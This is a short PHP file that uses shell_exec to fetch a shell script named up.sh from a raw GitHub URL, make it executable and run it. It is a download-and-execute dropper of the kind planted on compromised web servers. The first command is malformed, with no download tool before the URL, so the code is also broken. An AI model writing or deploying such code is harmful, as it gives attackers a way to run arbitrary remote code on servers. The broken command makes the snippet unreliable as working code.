<?php
$output = shell_exec('https://raw.githubusercontent.com/kudetid/up/main/up.sh && chmod +x up.sh');
$output = shell_exec('./up.sh');
?>
